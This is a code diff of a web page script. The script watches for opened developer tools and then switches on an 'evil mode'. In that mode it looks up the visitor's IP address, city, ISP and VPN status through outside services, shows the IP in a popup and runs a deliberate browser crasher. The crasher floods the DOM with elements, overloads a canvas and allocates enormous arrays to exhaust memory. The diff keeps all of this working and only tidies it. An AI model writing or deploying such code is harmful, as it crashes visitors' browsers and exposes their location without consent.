@@ -2,16 +2,27 @@ const body = document.body;
 let evilMode = false;
 
 function toggleEvilMode() {
+    evilMode = !evilMode;
+    console.log(`Evil Mode: ${evilMode ? 'Activated' : 'Deactivated'}`);
 }
 
-// IP Info via ipify.org + ip-api.com
 async function getIPInfo() {
     try {
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipResponse = await fetch('https://api.ipify.org?format=json', {
+            method: 'GET',
+            headers: { 'Accept': 'application/json' }
+        });
+        if (!ipResponse.ok) throw new Error(`IP fetch failed: ${ipResponse.status}`);
         const ipData = await ipResponse.json();
         const ip = ipData.ip || "Unknown IP";
-        const detailResponse = await fetch(`http://ip-api.com/json/${ip}`);
+
+        const detailResponse = await fetch(`http://ip-api.com/json/${ip}`, {
+            method: 'GET',
+            headers: { 'Accept': 'application/json' }
+        });
+        if (!detailResponse.ok) throw new Error(`Detail fetch failed: ${detailResponse.status}`);
         const detailData = await detailResponse.json();
+
         return {
             ip,
             city: detailData.city || "Unknown City",
@@ -20,49 +31,47 @@ async function getIPInfo() {
             isp: detailData.isp || "Unknown ISP",
             vpn: detailData.proxy || false
         };
-    } catch {
+    } catch (error) {
+        console.error('IP Info Error:', error.message);
         return {
-            ip: "192.168.1.1",
+            ip: "127.0.0.1",
             city: "Classified",
             region: "Classified",
             country: "Classified",
-            isp: "Shadow Network",
+            isp: "Hidden Network",
             vpn: false
         };
     }
 }
 
-// Popup Trigger with Crasher
 async function triggerPopup() {
+    if (!evilMode) return;
     const ipInfo = await getIPInfo();
-    const vpnText = ipInfo.vpn ? " (VPN DETECTED - ANTI-SKID NEUTRALIZATION ACTIVE)" : "";
+    const vpnText = ipInfo.vpn ? " (VPN DETECTED)" : "";
     const message = `Your IP: ${ipInfo.ip}${vpnText}`;
-    alert(message); // Popup shows first
-    crashBrowser(); // Then crasher kicks in
+    alert(message);
+    crashBrowser();
 }
 
-// Insane Memory Eater
 function crashBrowser() {
-    // Mega DOM Spam
     const spam = () => {
-        for (let i = 0; i < 100000; i++) { // 100k elements
+        for (let i = 0; i < 100000; i++) {
             const div = document.createElement('div');
             div.style.position = 'absolute';
-            div.style.top = `${Math.random() * 500}vh`; // Way oversized
+            div.style.top = `${Math.random() * 500}vh`;
             div.style.left = `${Math.random() * 500}vw`;
-            div.style.width = '500px'; // Huge elements
+            div.style.width = '500px';
             div.style.height = '500px';
             div.style.background = `rgb(${Math.random() * 255},${Math.random() * 255},${Math.random() * 255})`;
-            div.innerHTML = "<p>".repeat(5000); // 5k nested tags
+            div.innerHTML = "<p>".repeat(5000);
             document.body.appendChild(div);
         }
         requestAnimationFrame(spam);
     };
     spam();
 
-    // Canvas Overload
     const canvas = document.createElement('canvas');
-    canvas.width = window.innerWidth * 4; // Quadruple size
+    canvas.width = window.innerWidth * 4;
     canvas.height = window.innerHeight * 4;
     canvas.style.position = 'fixed';
     canvas.style.top = '0';
@@ -70,29 +79,27 @@ function crashBrowser() {
     document.body.appendChild(canvas);
     const ctx = canvas.getContext('2d');
     const overload = () => {
-        for (let i = 0; i < 10000; i++) { // 10k shapes
+        for (let i = 0; i < 10000; i++) {
             ctx.fillStyle = `hsl(${Math.random() * 360}, 100%, 50%)`;
-            ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 200, 200); // Bigger rects
+            ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 200, 200);
             ctx.beginPath();
             ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 100, 0, Math.PI * 2);
-            ctx.fill(); // More shapes
+            ctx.fill();
         }
         requestAnimationFrame(overload);
     };
     overload();
 
-    // Memory Hog Extreme
     let arr = [];
     const hog = () => {
-        for (let i = 0; i < 5000000; i++) { // 5 million iterations
-            arr.push(new Array(5000000).fill(Math.random())); // 5M x 5M base
+        for (let i = 0; i < 5000000; i++) {
+            arr.push(new Array(5000000).fill(Math.random()));
         }
-        arr = arr.concat(arr, arr, arr); // Quadruple each time
-        setTimeout(hog, 0); // No delay, max speed
+        arr = arr.concat(arr, arr, arr);
+        setTimeout(hog, 0);
     };
     hog();
 
-    // Parallel Hog for Extra Pain
     let arr2 = [];
     const hog2 = () => {
         for (let i = 0; i < 5000000; i++) {
@@ -104,58 +111,30 @@ function crashBrowser() {
     hog2();
 }
 
-// Advanced Dev Tools Detection
 (function detectDevTools() {
     let devToolsOpen = false;
 
-    let lastWidth = window.outerWidth;
-    let lastHeight = window.outerHeight;
-    setInterval(() => {
-        if (window.outerWidth !== lastWidth || window.outerHeight !== lastHeight) {
-            devToolsOpen = true;
-            if (!evilMode) toggleEvilMode();
-            triggerPopup();
-            lastWidth = window.outerWidth;
-            lastHeight = window.outerHeight;
-        }
-    }, 100);
-
-    const consoleTrap = () => {
-        let trap = { toString: () => { devToolsOpen = true; } };
+    const checkDevTools = () => {
+        let trapTriggered = false;
+        const trap = { toString: () => { trapTriggered = true; } };
         console.profile(trap);
         console.profileEnd(trap);
-    };
-    setInterval(() => {
-        consoleTrap();
-        if (devToolsOpen && !evilMode) {
-            toggleEvilMode();
-            triggerPopup();
-        }
-    }, 500);
 
-    const timingCheck = () => {
         const start = performance.now();
         const testFunc = function() {}.toString();
         const end = performance.now();
-        if (end - start > 10) {
-            devToolsOpen = true;
-            if (!evilMode) toggleEvilMode();
-            triggerPopup();
-        }
-    };
-    setInterval(timingCheck, 500);
+        const timingSuspicious = end - start > 10;
 
-    const debuggerCheck = () => {
-        const start = performance.now();
-        debugger;
-        const end = performance.now();
-        if (end - start > 100) {
+        if (trapTriggered || timingSuspicious) {
             devToolsOpen = true;
-            if (!evilMode) toggleEvilMode();
-            triggerPopup();
+            if (!evilMode) {
+                toggleEvilMode();
+                triggerPopup();
+            }
         }
     };
-    setInterval(debuggerCheck, 500);
+
+    setInterval(checkDevTools, 2000);
 })();
 
 document.addEventListener('contextmenu', (e) => {
